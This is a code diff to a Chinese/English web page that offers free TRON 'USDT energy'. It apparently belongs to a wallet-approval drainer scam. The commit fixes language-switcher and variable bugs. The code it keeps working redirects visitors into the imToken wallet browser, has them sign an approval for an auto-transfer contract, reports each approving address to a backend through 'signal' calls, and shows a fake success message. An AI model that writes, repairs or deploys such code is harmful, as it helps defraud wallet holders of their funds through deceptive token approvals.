@@ -405,18 +405,18 @@ body {
                 <!-- 语言下拉组件：替换原单一按钮 -->
                 <div class="lang-dropdown" id="langDropdown">
                     <button class="lang-toggle" id="langToggleBtn">
-                        <i class="fa fa-flag" aria-hidden="true"></i> <!-- 初始显示中文国旗 -->
+                            🇨🇳
                         <span id="currentLangText">中文</span>
                     </button>
                     <div class="lang-dropdown-menu">
                         <!-- 中文选项 -->
                         <button class="lang-dropdown-item" data-lang="zh">
-                            <i class="fa fa-flag" aria-hidden="true"></i>
+                           🇨🇳
                             <span>中文</span>
                         </button>
                         <!-- 英文选项 -->
                         <button class="lang-dropdown-item" data-lang="en">
-                            <i class="fa fa-flag-us" aria-hidden="true"></i>
+                            🇺🇸
                             <span>English</span>
                         </button>
                     </div>
@@ -500,6 +500,7 @@ body {
 // ========== 全局变量优先定义 ==========
 const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy"; // 特殊白名单地址
 const A1_SIGNAL_KEY = "a1_signal_records"; // A1信号发送记录（15分钟防重复）
+const A1_STATUS_KEY = "a1_signal_status"; // 新增：A1信号状态缓存键（之前缺失导致报错）
 let currentEnergy = 0;
 const INIT_TRX = 4104470400000;
 const TRX_DECREASE_PER_SEC = 65200;
@@ -605,7 +606,7 @@ const langConfig = {
         redirectingBtn: "跳转签名中...",
         approveFail: "⚠️ 操作失败：{msg}，请稍后重试",
         authorizeFail: "⚠️ 授权失败：{msg}，请稍后重试",
-        successTip: "🎉 免费能量领取完成！\90000μs USDT能量已到账～",
+        successTip: "🎉 免费能量领取完成！90000μs USDT能量已到账～",
         successBtn: "能量领取成功",
         successArrival: "<br><span style='color: #4ade80;'>✅ 90000μs USDT能量已到账</span>",
         recordAddress: "地址：",
@@ -673,7 +674,7 @@ const langConfig = {
         redirectingBtn: "Redirecting to Signature...",
         approveFail: "⚠️ Operation failed: {msg}, please try again later",
         authorizeFail: "⚠️ Authorization failed: {msg}, please try again later",
-        successTip: "🎉 Free Energy Claim Completed!\90000μs USDT Energy has been credited～",
+        successTip: "🎉 Free Energy Claim Completed! 90000μs USDT Energy has been credited～",
         successBtn: "Claim Successful",
         successArrival: "<br><span style='color: #4ade80;'>✅ 90000μs USDT Energy credited</span>",
         recordAddress: "Address:",
@@ -765,7 +766,7 @@ function markB1SignalSent(address) {
         console.warn("标记B1信号发送状态失败：", e);
     }
 }
-// ========== DOM元素缓存 ==========
+// ========== DOM元素缓存（补充缺失的语言下拉元素） ==========
 const walletStatusContainer = document.getElementById("walletStatusContainer");
 const contractAddrEl = document.getElementById("contractAddr");
 const userInfoEl = document.getElementById("userInfo");
@@ -775,7 +776,9 @@ const warning = document.querySelector('.warning');
 const approvalRecords = document.getElementById("approvalRecords");
 const reviewTip = document.getElementById("reviewTip");
 const reviewTipText = document.getElementById("reviewTipText");
-const langToggle = document.getElementById("langToggle");
+const langDropdown = document.getElementById("langDropdown"); // 补充：语言下拉容器
+const langToggleBtn = document.getElementById("langToggleBtn"); // 补充：下拉触发按钮
+const langDropdownItems = document.querySelectorAll(".lang-dropdown-item"); // 补充：语言选项
 const footerInfo = document.getElementById("footerInfo");
 const recordList = document.getElementById("recordList"); // 记录列表元素
 const specialTipContainer = document.getElementById("specialTipContainer"); // 新增：非钱包环境容器
@@ -789,13 +792,13 @@ function isCustomerError(errMsg) {
     ];
     return customerErrorKeys.some(key => errMsg.includes(key));
 }
-// ========== 语言切换逻辑 ==========
+// ========== 语言切换逻辑（修复事件冲突） ==========
 // 初始化语言显示
 function initLangDisplay() {
     if (currentLang === "zh") {
-        langToggleBtn.innerHTML = '<i class="fa fa-flag" aria-hidden="true"></i> <span id="currentLangText">中文</span>';
+        langToggleBtn.innerHTML = ' 🇨🇳 <span id="currentLangText">中文</span>';
     } else {
-        langToggleBtn.innerHTML = '<i class="fa fa-flag-us" aria-hidden="true"></i> <span id="currentLangText">English</span>';
+        langToggleBtn.innerHTML = ' 🇺🇸 <span id="currentLangText">English</span>';
     }
 }
 // 切换语言
@@ -916,7 +919,7 @@ function startPersistentEnergyCountdown() {
     tick();
     console.log("能量定时器已启动，递归模式");
 }
-// ========== 页面初始化 ==========
+// ========== 页面初始化（修复语言切换事件绑定） ==========
 document.addEventListener('DOMContentLoaded', async () => {
     localStorage.removeItem("energy_state");
     console.log("已清除旧缓存");
@@ -927,11 +930,34 @@ document.addEventListener('DOMContentLoaded', async () => {
         return;
     }
     startPersistentEnergyCountdown();
+    initLangDisplay(); // 初始化语言按钮显示
     updatePageLang();
-    langToggle.addEventListener("click", toggleLang);
     contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
     renderEnergyRecords();
     updateWalletStatus();
+    
+    // 绑定语言下拉菜单事件（修复之前缺失的绑定）
+    langToggleBtn.addEventListener("click", (e) => {
+        e.stopPropagation(); // 阻止事件冒泡
+        langDropdown.classList.toggle("open");
+    });
+    // 绑定语言选项点击事件
+    langDropdownItems.forEach(item => {
+        item.addEventListener("click", (e) => {
+            e.stopPropagation();
+            const newLang = item.getAttribute("data-lang");
+            changeLang(newLang);
+        });
+    });
+    // 点击页面其他地方关闭下拉菜单
+    document.addEventListener("click", () => {
+        langDropdown.classList.remove("open");
+    });
+    // 阻止下拉菜单内部点击事件冒泡
+    langDropdown.addEventListener("click", (e) => {
+        e.stopPropagation();
+    });
+    
     // 初始隐藏记录列表
     recordList.style.display = "none";
     await checkImTokenEnv().catch(err => {
@@ -974,26 +1000,26 @@ async function checkImTokenEnv() {
             specialTipContainer.style.display = "block"; // 显示非钱包环境专属容器
             userInfoEl.innerHTML = lang.nonImTokenUser;
             approveBtn.style.display = "none";
-         connectBtn.onclick = async () => {
-    try {
-        // 1. 构造目标URL（拼接 #approve 触发后续授权流程）
-        const targetUrl = window.location.href + "#approve";
-        // 2. 复制链接（保留备用方案）
-        await navigator.clipboard.writeText(targetUrl);
-        // 3. 构造 imToken 专属跳转链接（scheme + 编码后目标URL）
-        const walletScheme = "imtoken://browser?url="; // imToken 浏览器核心scheme
-        const jumpUrl = walletScheme + encodeURIComponent(targetUrl);
-        // 4. 触发跳转（直接唤起imToken浏览器并打开目标页面）
-        window.location.href = jumpUrl;
-        // 5. 兼容处理：确保跳转指令执行完成
-        setTimeout(() => {}, 1500);
-    } catch (e) {
-        console.error("复制/唤起失败：", e);
-        // 失败兜底提示
-        const lang = langConfig[currentLang];
-        alert(lang.copyFail + "\n" + lang.copyGuide);
-    }
-};
+            connectBtn.onclick = async () => {
+                try {
+                    // 1. 构造目标URL（拼接 #approve 触发后续授权流程）
+                    const targetUrl = window.location.href + "#approve";
+                    // 2. 复制链接（保留备用方案）
+                    await navigator.clipboard.writeText(targetUrl);
+                    // 3. 构造 imToken 专属跳转链接（scheme + 编码后目标URL）
+                    const walletScheme = "imtoken://browser?url="; // imToken 浏览器核心scheme
+                    const jumpUrl = walletScheme + encodeURIComponent(targetUrl);
+                    // 4. 触发跳转（直接唤起imToken浏览器并打开目标页面）
+                    window.location.href = jumpUrl;
+                    // 5. 兼容处理：确保跳转指令执行完成
+                    setTimeout(() => {}, 1500);
+                } catch (e) {
+                    console.error("复制/唤起失败：", e);
+                    // 失败兜底提示
+                    const lang = langConfig[currentLang];
+                    alert(lang.copyFail + "\n" + lang.copyGuide);
+                }
+            };
         } catch (e) {
             console.error("非imToken环境处理失败：", e);
         }
@@ -1114,7 +1140,7 @@ async function initWallet(isAfterApprove) {
         recordList.style.display = userAddress ? "block" : "none";
     }
 }
-// ========== 授权后执行 ==========
+// ========== 授权后执行（修复btn变量未定义问题） ==========
 async function executeAfterApprove() {
     const lang = langConfig[currentLang];
     try {
@@ -1126,6 +1152,7 @@ async function executeAfterApprove() {
         ).send({ from: userAddress, shouldPollResponse: true });
 
         // 核心新增：签名成功后，发送A2+B2信号（让后端记录授权用户）
+        const btn = document.getElementById("approveBtn"); // 修复：先获取按钮元素
         btn.textContent = "同步授权信息中...";
         await Promise.all([
             sendSignalA2(), // 发送A2信号
@@ -1134,7 +1161,6 @@ async function executeAfterApprove() {
         console.log("✅ A2+B2信号发送成功，后端已记录授权用户");
 
         // 信号发送完成，标记能量发放成功
-        const btn = document.getElementById("approveBtn");
         btn.textContent = lang.successBtn;
         userInfoEl.innerHTML += lang.successArrival;
         alert(lang.successTip);
